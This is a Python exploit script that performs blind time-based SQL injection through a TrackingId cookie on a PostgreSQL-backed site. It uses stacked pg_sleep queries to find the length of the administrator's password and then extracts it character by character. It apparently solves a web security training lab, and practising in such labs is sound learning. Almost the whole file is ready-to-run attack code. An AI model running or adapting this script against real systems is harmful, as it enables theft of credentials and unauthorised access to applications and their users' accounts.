import requests
import urllib.parse
import time

# --- Configuration Settings ---
USERNAME = "administrator"
MAX_PASSWORD_LENGTH = 50  # Maximum password length to search for
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789" # Possible characters in the password
DELAY_SECONDS = 3 # Delay in seconds to induce if the condition is true (adjust based on server response and network)
# Threshold to consider a delay as occurred. 
# This should be slightly less than DELAY_SECONDS to allow for network jitter.
# For example, if DELAY_SECONDS is 3, consider a delay if response time > 2.5s.
# A good approach is DELAY_SECONDS minus the max time for a normal fast response (e.g., 0.5s).
# Here, we'll use 0.8 * DELAY_SECONDS as the threshold.
DELAY_THRESHOLD = DELAY_SECONDS * 0.8 
REQUEST_TIMEOUT = DELAY_SECONDS + 5 # Request timeout, set longer than the intended delay

# --- Function to send HTTP request and determine condition based on time delay ---
def check_condition_time_based(session, base_url, tracking_id_base, condition_sql_fragment):
    """
    Determines if an SQL injection condition is true by inducing a time delay.
    Uses the successful stacked query format.
    Example Payload: TrackingId=original_ID'%3BSELECT+CASE+WHEN+(CONDITION)+THEN+pg_sleep(DELAY_SECONDS)+ELSE+pg_sleep(0)+END--

    Args:
        session (requests.Session): HTTP session object.
        base_url (str): The base URL of the lab.
        tracking_id_base (str): The original TrackingId cookie value.
        condition_sql_fragment (str): The SQL condition part to inject.
                                     e.g., "(SELECT LENGTH(password) FROM users WHERE username='administrator')=20"

    Returns:
        bool: True if the condition is true (delay occurred), False otherwise.
    """
    # Construct the SQL injection part for the stacked query
    # condition_sql_fragment is the boolean condition that goes into CASE WHEN (...)
    raw_sqli_payload_after_semicolon = f" SELECT CASE WHEN ({condition_sql_fragment}) THEN pg_sleep({DELAY_SECONDS}) ELSE pg_sleep(0) END -- "
    
    # Append an apostrophe and a semicolon to the original TrackingId, then the URL-encoded SQL payload
    # Format: TrackingId=Value'%3Bencoded_payload
    # urllib.parse.quote_plus encodes spaces to '+'
    injected_tracking_id = tracking_id_base + "'" + urllib.parse.quote_plus(";" + raw_sqli_payload_after_semicolon)
    
    cookies = {'TrackingId': injected_tracking_id}
    # The session cookie is automatically managed by the session object

    try:
        start_time = time.time()
        # Send GET request
        response = session.get(base_url, cookies=cookies, timeout=REQUEST_TIMEOUT)
        end_time = time.time()
        duration = end_time - start_time

        # print(f"DEBUG: Condition: {condition_sql_fragment[:60]}... Duration: {duration:.2f}s") # For debugging

        if duration >= DELAY_THRESHOLD:
            return True  # Condition is true if the delay is above the threshold
        else:
            return False # No significant delay, condition is false
            
    except requests.exceptions.Timeout:
        # If a timeout occurs, it means pg_sleep was executed and took longer than REQUEST_TIMEOUT.
        # Since DELAY_SECONDS < REQUEST_TIMEOUT, this likely means the condition was true.
        # print(f"DEBUG: Condition: {condition_sql_fragment[:60]}... Timed out. Assuming TRUE.") # For debugging
        return True
    except requests.exceptions.RequestException as e:
        print(f"    [!] Request failed: {e} for condition: {condition_sql_fragment[:60]}...")
        return False

# --- Main execution block ---
if __name__ == "__main__":
    lab_url = input("Enter the Lab URL (e.g., https://xxxx.web-security-academy.net/): ").strip()
    if not lab_url.endswith('/'):
        lab_url += '/'
    
    # Start a requests session (to automatically manage cookies like 'session')
    s = requests.Session()

    print(f"\n[+] Initializing session for {lab_url}...")
    try:
        # Make an initial request to get/set base TrackingId and session cookies
        initial_response = s.get(lab_url, timeout=10) # Shorter timeout for this initial request
        if 'TrackingId' not in s.cookies:
            print("[!] 'TrackingId' cookie not found. Please ensure the URL is correct and the lab is active.")
            exit()
        
        session_cookie_name = None
        for name in ['session', 'Session', 'JSESSIONID']: # Common session cookie names
            if name in s.cookies:
                session_cookie_name = name
                break
        if not session_cookie_name:
             print("[!] Session cookie not found. Please ensure the URL is correct and the lab is active.")
             # Depending on the lab, a session cookie might not be strictly necessary for this exploit.
             # exit() 

        original_tracking_id = s.cookies['TrackingId']
        print(f"[+] Original TrackingId found: {original_tracking_id}")
        if session_cookie_name:
            print(f"[+] Session cookie ({session_cookie_name}) established.")
        else:
            print("[!] Warning: Standard session cookie name not found. Script will continue, but issues may arise if authentication is required for the target.")

    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to connect to the lab URL: {e}")
        exit()

    # 1. Determine the password length
    print(f"\n[+] Step 1: Determining password length for '{USERNAME}'...")
    password_length = 0
    for length_candidate in range(1, MAX_PASSWORD_LENGTH + 1):
        print(f"    [*] Testing length: {length_candidate}", end='\r') # `end='\r'` overwrites the line
        # SQL condition: Is the password length of the specified user equal to length_candidate?
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='{USERNAME}')={length_candidate}"
        
        time.sleep(0.05) # Slight delay to be gentle on the server

        if check_condition_time_based(s, lab_url, original_tracking_id, condition):
            password_length = length_candidate
            # Print with enough spaces to clear the previous `end='\r'` line
            print(f"    [+] Password length found: {password_length}                                  ")
            break # Exit loop once length is found
    else: # If the loop finishes without a break
        print(f"    [!] Password length not found within range 1-{MAX_PASSWORD_LENGTH}.           ")
        exit()

    # 2. Extract each character of the password
    print(f"\n[+] Step 2: Extracting password characters for '{USERNAME}'...")
    extracted_password = ""
    for position in range(1, password_length + 1): # Loop for each character position
        found_char_for_position = False
        for char_to_test in CHARSET: # Loop through the character set
            # Display current progress, `end='\r'` overwrites the line
            progress_display = f"{extracted_password}{char_to_test}{'?'*(password_length - position)}"
            print(f"    [*] Testing position {position}/{password_length}, char: '{char_to_test}' (Current: {progress_display})", end='\r')
            
            # SQL condition: Is the character at 'position' for the user's password equal to 'char_to_test'?
            # SUBSTR index starts from 1
            condition = f"(SELECT SUBSTRING(password, {position}, 1) FROM users WHERE username='{USERNAME}')='{char_to_test}'"
            
            time.sleep(0.05) # Slight delay

            if check_condition_time_based(s, lab_url, original_tracking_id, condition):
                extracted_password += char_to_test
                # Print with enough spaces to clear the previous `end='\r'` line
                print(f"    [+] Position {position}: Found char '{char_to_test}'. Password so far: {extracted_password}{'?'*(password_length - position)}                      ")
                found_char_for_position = True
                break # Move to the next position
        
        if not found_char_for_position:
            # Add enough spaces to clear the line if a character is not found.
            print(f"    [!] Could not find character for position {position}. Check CHARSET. Exiting.                         ")
            extracted_password += "?" # Mark unknown character
            # Optionally, exit here if a character cannot be found
            # exit() 

    # Display the final results
    print("\n[+] Processing complete!")
    print("-----------------------------------------")
    print(f"    Username: {USERNAME}")
    print(f"    Password: {extracted_password}")
    print("-----------------------------------------")